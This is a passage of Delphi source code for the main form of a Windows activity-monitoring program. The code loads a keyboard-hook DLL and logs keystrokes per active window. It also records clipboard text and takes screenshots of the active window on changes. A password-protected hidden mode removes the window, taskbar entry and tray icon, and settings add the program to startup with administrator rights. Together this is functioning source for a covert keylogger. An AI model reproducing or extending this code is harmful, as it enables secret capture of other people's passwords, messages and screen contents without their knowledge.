 if spSkinEdit_TITLE.Text='' then Timer_loadlog.Enabled:=True;
end;

procedure TForm1.spSkinEdit_VALUEKeyUp(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
 if Key = 13 then Timer_loadlog.Enabled:=True;
 if spSkinEdit_VALUE.Text='' then Timer_loadlog.Enabled:=True;
end;

procedure TForm1.spSkinHeaderControl1SectionResize(
  HeaderControl: THeaderControl; Section: THeaderSection);
begin
 spSkinStringGrid1.ColWidths[Section.Index]:=Section.Width - 1;
 if Section.Index = 0 then spSkinMenuSpeedButton_EVENT.Width:= Section.Width - 4;
 if Section.Index = 1 then spSkinPanel_TIME.Width:=Section.Width + 2;
 if Section.Index = 2 then spSkinEdit_TITLE.Width:= Section.Width - spSkinSpeedButton_TITLE.Width - 20;
 if Section.Index = 3 then spSkinEdit_APP.Width:= Section.Width - spSkinSpeedButton_APP.Width - 20;
 if Section.Index = 4 then spSkinEdit_VALUE.Width:= Section.Width - spSkinSpeedButton_VALUE.Width - 20;
end;

procedure TForm1.spSkinImagesMenu1Change(Sender: TObject);
begin
 Timer_loadlog.Enabled:=True;
end;

procedure TForm1.spSkinMonthCalendar1Click(Sender: TObject);
begin
 Timer_loadlog.Enabled:=True;
end;

procedure TForm1.spSkinSpeedButton_MinimizeClick(Sender: TObject);
begin
 Application.Minimize;
 Form1.Visible:=False;
end;

procedure TForm1.spSkinSpeedButton_TITLEClearClick(Sender: TObject);
begin
 if spSkinEdit_TITLE.Text <> '' then
  begin
   spSkinEdit_TITLE.Text:='';
   Timer_loadlog.Enabled:=True;
  end;
end;

procedure TForm1.spSkinSpeedButton_HomeClick(Sender: TObject);
begin
 GotoHomePage;
end;

procedure TForm1.spSkinSpeedButton_AboutClick(Sender: TObject);
begin
 Form_About.ShowModal;
end;

procedure TForm1.spSkinSpeedButton_APPClearClick(Sender: TObject);
begin
 if spSkinEdit_APP.Text <> '' then
  begin
   spSkinEdit_APP.Text:='';
   Timer_loadlog.Enabled:=True;
  end;
end;

procedure TForm1.spSkinSpeedButton_APPClick(Sender: TObject);
begin
 if spSkinEdit_APP.Text <> '' then Timer_loadlog.Enabled:=True
 else spSkinEdit_APP.SetFocus;
end;

procedure TForm1.spSkinSpeedButton_ExitClick(Sender: TObject);
begin
 Close;
end;

procedure TForm1.spSkinSpeedButton_HideClick(Sender: TObject);
begin
 Hide1Click(nil);
end;

procedure TForm1.spSkinSpeedButton_SettingClick(Sender: TObject);
var
    BRes             : boolean;
    lpVersionInformation : TOSVersionInfo;

 procedure SetParams(Param, Action, Value: string);
  var ini: TIniFile;
  begin
   ini:=TIniFile.Create(AppDataDir + 'temp\prm.tmp');
   ini.WriteString(Param, 'Action', Action);
   ini.WriteString(Param, 'Value', Value);   
   ini.Free;
  end;
begin
 if Form_Settings.ShowModal = mrOk then
  begin
   SaveSettings;

   if Form_Settings.spSkinComboBox_LNG.Tag = 1 then
    SetLanguage(Form_Settings.spSkinComboBox_LNG.Text);

   if Form_Settings.spSkinComboBox_SKIN.Tag = 1 then
   Form1.spSkinData1.LoadFromCompressedFile(ExeDir + 'skins\'+ Form_Settings.spSkinComboBox_SKIN.Text);

  if Form_Settings.spSkinCheckRadioBox_HideDS.Tag = 1 then
  Form_Settings.EnableDS(not Form_Settings.spSkinCheckRadioBox_HideDS.Checked);

  if Form_Settings.spSkinCheckRadioBox_HideSM.Tag = 1 then
  Form_Settings.EnableSM(not Form_Settings.spSkinCheckRadioBox_HideSM.Checked);

  if Form_Settings.spSkinCheckRadioBox_HideIP.Tag = 1 then
  if Form_Settings.spSkinCheckRadioBox_HideIP.Checked then
   SetParams('IP', 'DELETE', '')
  else
    SetParams('IP', 'ADD', AppDataDir + 'temp\reg\info.uid');

  if Form_Settings.spSkinCheckRadioBox_Run.Tag = 1 then
  begin
    if Form_Settings.spSkinCheckRadioBox_Run.Checked
     then
       SetParams('RUN', 'ADD', Application.ExeName)
     else
       SetParams('RUN', 'DELETE', '')
  end;

  if Form_Settings.spSkinCheckRadioBox_Hide.Tag = 1 then
  begin
   if Form_Settings.spSkinCheckRadioBox_Hide.Checked
     then
      SetParams('PWD', 'ADD', EncryptStr(Form_Settings.spSkinPasswordEdit.Text, StartKey, MultKey, AddKey))
     else
      SetParams('DELETE', 'ADD', '');
  end;

  if FileExists(AppDataDir + 'temp\prm.tmp') then
   begin
    lpVersionInformation.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
    BRes := GetVersionEx(lpVersionInformation);
    if lpVersionInformation.dwMajorVersion > 5 then
        RunAsAdministrator(ExeDir + 'settings.exe')
    else
        ShellExecute(Handle, 'open', PChar(ExeDir + 'settings.exe'), PChar('"' + APP_NAME + '"'),'', SW_SHOWDEFAULT);
   end;

  end; // Ok
end;

procedure TForm1.spSkinSpeedButton_TITLEClick(Sender: TObject);
begin
 if spSkinEdit_TITLE.Text <> '' then Timer_loadlog.Enabled:=True
 else spSkinEdit_TITLE.SetFocus;
end;

procedure TForm1.spSkinSpeedButton_VALUEClearClick(Sender: TObject);
begin
 if spSkinEdit_VALUE.Text <> '' then
  begin
   spSkinEdit_VALUE.Text:='';
   Timer_loadlog.Enabled:=True;
  end;
end;

procedure TForm1.spSkinSpeedButton_VALUEClick(Sender: TObject);
begin
 if spSkinEdit_VALUE.Text <> '' then Timer_loadlog.Enabled:=True
 else spSkinEdit_VALUE.SetFocus;
end;

procedure TForm1.spSkinStringGrid1Click(Sender: TObject);
var jpg:TJPEGImage;
begin
 spSkinMemo2.Text:=RestoreBadChars(spSkinStringGrid1.Cells[4, spSkinStringGrid1.Row]);

 if EvertsCode[spSkinStringGrid1.Row] = 4 then
  begin
   spSkinNotebook1.ActivePage:='Picture';
   scrFileName:=AppDataDir + spSkinStringGrid1.Cells[4, spSkinStringGrid1.Row];
   if FileExists(scrFileName) then
    begin
     try
      jpg:=TJPEGImage.Create;
      jpg.LoadFromFile(scrFileName);
      Image_Trumb.Picture.Bitmap.Assign(jpg);
      jpg.Free;
     except if jpg<>nil then jpg.Free; end;
     end
   else
    begin
     scrFileName:='';
    end;
  end
 else spSkinNotebook1.ActivePage:='Text';
end;

procedure TForm1.spSkinStringGrid1DrawCell(Sender: TObject; ACol, ARow: Integer;
  Rect: TRect; State: TGridDrawState);
var DrawRect: TRect;
begin
 if spSkinStringGrid1.Cells[1, 0] = '' then exit;
 DrawRect:=Rect;
 DrawRect.Left:=DrawRect.Left + Round((Rect.Right - Rect.Left) / 2) - 8;
 DrawRect.Top:=DrawRect.Top + 1;
 DrawRect.Right:=DrawRect.Left + 16;
 DrawRect.Bottom:=DrawRect.Top + 16;
 if ACol = 0 then
  begin
   case EvertsCode[ARow] of
    1: spPngImageList_EVENTS.PngImages.Items[1].PngImage.Draw(spSkinStringGrid1.Canvas, DrawRect);
    2: spPngImageList_EVENTS.PngImages.Items[2].PngImage.Draw(spSkinStringGrid1.Canvas, DrawRect);
    3: spPngImageList_EVENTS.PngImages.Items[2].PngImage.Draw(spSkinStringGrid1.Canvas, DrawRect);
    4: spPngImageList_EVENTS.PngImages.Items[0].PngImage.Draw(spSkinStringGrid1.Canvas, DrawRect);
   end;
  end;
end;

procedure TForm1.spTrayIcon1DblClick(Sender: TObject);
begin
 spTrayIcon1.ShowMainForm;
 SetForegroundWindow(Handle);
 Timer_loadlog.Enabled:=True;
end;

procedure TForm1.WMDrawClipboard(var Msg: TWMDrawClipboard);
var
 S : string;
begin
 SendMessage(FNextViewer, WM_DRAWCLIPBOARD, 0, 0);
 Msg.Result:=0;
 if not spSkinSpeedButton_Start.Down then exit;
 if Clipboard.HasFormat(CF_TEXT) then
  begin
   S:=ClipBoard.AsText;  S:=DelBadChars(S);
   S:='CLIPBOARD_SET;'+DateTimeToStr(Now) + ';' + AppID + ';' + Copy(S,1,150);
   Save2Log(S);
  end;
  if Form_Settings.spSkinCheckRadioBox_clipchange.Checked then Timer_scr.Enabled:= True;
end;

procedure Tform1.WMChain(var Msg: TWMChangeCBChain);
begin
 if Msg.Remove = FNextViewer then
  FnextViewer:=Msg.Next
 else
  SendMessage(FNextViewer, WM_CHANGECBCHAIN, Msg.Remove, Msg.Next);
end;

procedure TForm1.DllMessage(var Msg: TMessage);
var spChar, S: string;
    pws: string;
    pwpos: integer;
begin
 if not spSkinSpeedButton_Start.Down then exit;
 spChar:='';

 case Msg.wParam of
  1 :  spChar:= '<Ctrl-A>';
  2 :  spChar:= '<Ctrl-B>';
  3 :  spChar:= '<Ctrl-C>';
  4 :  spChar:= '<Ctrl-D>';
  5 :  spChar:= '<Ctrl-E>';
  6 :  spChar:= '<Ctrl-F>';
  7 :  spChar:= '<Ctrl-G>';
  8 :  spChar:= '<BkSp>';
  9 :  spChar:= '<Tab>';
  10:  spChar:= '<Ctrl-J>';
  11:  spChar:= '<Ctrl-K>';
  12:  spChar:= '<Ctrl-L>';
  13:  spChar:= '<Enter>';
  14:  spChar:= '<Ctrl-N>';
  15:  spChar:= '<Ctrl-O>';
  16:  spChar:= '<Ctrl-P>';
  17:  spChar:= '<Ctrl-Q>';
  18:  spChar:= '<Ctrl-R>';
  19:  spChar:= '<Ctrl-S>';
  20:  spChar:= '<Ctrl-T>';
  21:  spChar:= '<Ctrl-U>';
  22:  spChar:= '<Ctrl-V>';
  23:  spChar:= '<Ctrl-W>';
  24:  spChar:= '<Ctrl-X>';
  25:  spChar:= '<Ctrl-Y>';
  26:  spChar:= '<Ctrl-Z>';
  27:  spChar:= '<Esc>';
  else spChar:= Chr(Msg.wParam);
 end;

 StrBuff:=StrBuff + spChar;

end;

procedure TForm1.Exit1Click(Sender: TObject);
begin
 Close;
end;

procedure TForm1.FormActivate(Sender: TObject);
var
  AppParth, FileName, Key: string;
begin
 if Form1.FirstAppRun then
  begin
   Form1.FirstAppRun:=False;
   spSkinSpeedButton_SettingClick(nil);
  end;
 if not LoadInProc then Timer_loadlog.Enabled:=True;
end;

procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
begin
 Button_stop.Click;
 SaveSettings;
end;

{------------------------------------------------------------------------------}
 function isWindows95_98:boolean;
 var
    BRes,Res             : boolean;
    lpVersionInformation : TOSVersionInfo;
 begin
  Res:=False;
  lpVersionInformation.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
  BRes := GetVersionEx(lpVersionInformation);
  if BRes then
   with lpVersionInformation do
     if dwPlatformId = VER_PLATFORM_WIN32_WINDOWS then
         if (dwMajorVersion=4) and ((dwMinorVersion=0) or (dwMinorVersion = 10)) then Res:=True;
  isWindows95_98:=Res;
end;

{------------------------------------------------------------------------------}
function CurEXEDir:string;
begin
 CurEXEDir:= ExtractFilePath(ParamStr(0));
end;

{------------------------------------------------------------------------------}
function PRGData: string;
var windir: string;
       res: string;
      PIDL: PItemIDList;
  TempPath: array[0..MAX_PATH] of Char;

begin
 if isWindows95_98 then
  begin
   windir:=GetEnvironmentVariable('windir');
   if DirectoryExists(windir) then
    begin
     windir:=windir+'Application Data';
     if not DirectoryExists(windir) then CreateDir(windir);
     res:=windir;
    end
  end
 else
  begin
   { All Users\Application Data }
   SHGetSpecialFolderLocation(Application.Handle, CSIDL_COMMON_APPDATA, PIDL);
   if PIDL <> nil then
   begin
    SHGetPathFromIDList(PIDL, TempPath);
    res:= string(TempPath);
    GlobalFreePtr(PIDL)
   end;
  end;

 if DirectoryExists(res) then
  begin
   res:=res+'\'+APP_NAME;
   if not DirectoryExists(res) then CreateDir(res);
  end
 else
  res:=CurExeDir;
 PRGData:=res+'\';
end;
{------------------------------------------------------------------------------}

procedure TForm1.FormCreate(Sender: TObject);
begin
 AppID:=';';
 newID:=';';
 StrBuff:='';
 scrFileName:='';
 FnextViewer:=SetClipboardViewer(Handle);
 AppDataDir:=PRGData;
 ExeDir:=ExtractFilePath(Application.ExeName);
 Form1.Caption := APP_NAME + ' ' + APP_VERSION;
 APP_PARAM:='?prg=' + StringReplace(APP_NAME, ' ', '_', [rfReplaceAll]);
end;
{------------------------------------------------------------------------------}

procedure TForm1.FormDestroy(Sender: TObject);
begin
 ChangeClipboardChain(Handle, FnextViewer);
 UnRegisterHotKey(Handle, id_HotKey);
end;

procedure TForm1.Hide1Click(Sender: TObject);
begin
 TestPS:=Form_Settings.spSkinPasswordEdit.Text;
 if TestPS <> '' then
  begin
   Form_Settings.spSkinCheckRadioBox_Hide.Checked:=True;
   Form_Settings.spSkinButton_OkClick(nil);
   Form1.Visible:=False;
   ShowWindow(Application.Handle, SW_HIDE);
  end
 else
  begin
   spSkinMessage1.MessageDlg(Perevod('Msg2'), mtError, [mbOK] , 0);
   Form_Settings.spSkinCheckRadioBox_Hide.Checked:=True;
   spSkinSpeedButton_SettingClick(nil);
  end;
end;

procedure TForm1.Image_TrumbClick(Sender: TObject);
begin
 if FileExists(scrFileName) then ShellExecute (Form1.Handle, nil, PChar(scrFileName), nil, nil, SW_RESTORE);
end;

procedure TForm1.Timer1Timer(Sender: TObject);
var
  myDate : TDateTime;
  myHour, myMin, mySec, myMilli : Word;
begin
 myDate:=Now;
 DecodeTime(myDate, myHour, myMin, mySec, myMilli);
 if (myHour=0) and (myMin=0) and (mySec < 3) then
  begin
   spSkinDateEdit1.Date:=Now;
   spSkinDateEdit2.Date:=Now;
   Timer_loadlog.Enabled:=True;
  end;

 spTrayIcon1.IconVisible := (TestPS = '');
 if not spSkinSpeedButton_Start.Down then exit;
 Button_Update.Click;
end;

procedure TForm1.Timer_HintTimer(Sender: TObject);
begin
 Timer_Hint.Enabled:=False;
 spTrayIcon1.HideBalloonHint;
end;

procedure TForm1.Timer_loadlogTimer(Sender: TObject);
begin
 Timer_loadlog.Enabled:=False;
 LoadLog(spSkinDateEdit1.Date, spSkinDateEdit2.Date);
end;

procedure TForm1.Timer_scrTimer(Sender: TObject);
var sFileName, sTime, sTime0, S: string;
    jpg:TJPEGImage;
    tempBitMap: TBitMap;
begin
 Timer_scr.Enabled:= False;
 tempBitMap:=TBitmap.Create;
 try ScreenShotActiveWindow(tempBitMap); except end;
 jpg:=TJPEGImage.Create;
 try jpg.Assign(tempBitMap); except end;
 try tempBitMap.Destroy; except end;
 jpg.CompressionQuality:=25;
 sTime:=DateTimeToStr(Now);
 sTime0:=sTime;
 sTime:=StringReplace(sTime, ':', '_', [rfReplaceAll]);
 sTime:=StringReplace(sTime, '\', '_', [rfReplaceAll]);
 sTime:=StringReplace(sTime, '/', '_', [rfReplaceAll]);
 sFileName:=AppDataDir + 'scr\' + sTime + '.jpg';
 try jpg.SaveToFile(sFileName); except end;
 try jpg.Destroy; except end;
 S:='SCREENSHOT;'+ sTime0 + ';' + AppID + ';' + 'scr\'+sTime+'.jpg';
 Save2Log(S);
end;

procedure TForm1.Button_startClick(Sender: TObject);
var
 StartHook1: TStartHook;
 SHresult: Byte;
begin
 Button_stop.Enabled:=true;
 Button_start.Enabled:=false;
 hLib2:=LoadLibrary(PChar(ExeDir + 'kbprs.dll'));
 @StartHook1:=GetProcAddress(hLib2, 'StartHook');
 if @StartHook1=nil then Exit;
 SHresult:=StartHook1(Memo_log.Handle, Handle);
end;

procedure TForm1.Button_stopClick(Sender: TObject);
var
 StopHook1: TStopHook;
begin
 @StopHook1:=GetProcAddress(hLib2, 'StopHook');
 if @StopHook1=nil
 then
  begin
   Exit;
  end;
 if StopHook1
 then
  begin
   Button_stop.Enabled:=false;
   Button_start.Enabled:=true;
  end;
 FreeLibrary(hLib2);
end;

procedure TForm1.Button_UpdateClick(Sender: TObject);
var sFileName, sTime: string;
    jpg:TJPEGImage;
    S : string;
begin
  UpdateID;
  if newID <> AppID then
   begin
    if Pos(ExtractFileName(Application.ExeName), AppID) = 0 then
    begin
     sTime:=DateTimeToStr(Now); 
     if (StrBuff <> '') and (Trim(AppID) <> '') then
      begin
       S:='KEYBOARD;'+ sTime + ';' + AppID + ';' + DelBadChars(StrBuff);
       Save2Log(S);
       StrBuff:='';
      end;
     end;

    AppID:=newID; // !!!
   if Pos(ExtractFileName(Application.ExeName), AppID) = 0 then
    if Form_Settings.spSkinCheckRadioBox_winchange.Checked then Timer_scr.Enabled:= True;
   end;
end;

procedure TForm1.Clipboard1Click(Sender: TObject);
begin
 spSkinMenuSpeedButton_EVENT.ImageIndex:=2;
 Timer_loadlog.Enabled:=True;
end;

end.
